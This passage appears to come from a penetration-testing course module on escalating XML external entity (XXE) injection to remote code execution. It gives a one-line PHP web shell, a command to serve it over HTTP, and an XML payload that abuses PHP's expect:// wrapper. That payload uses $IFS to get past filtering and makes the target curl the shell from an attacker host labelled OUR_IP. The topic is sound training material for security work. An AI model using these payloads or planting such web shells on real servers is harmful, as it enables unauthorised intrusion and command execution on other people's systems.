In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

  Local File Disclosure

```shell-session
hidalg0dd@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
hidalg0dd@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:

Code: xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
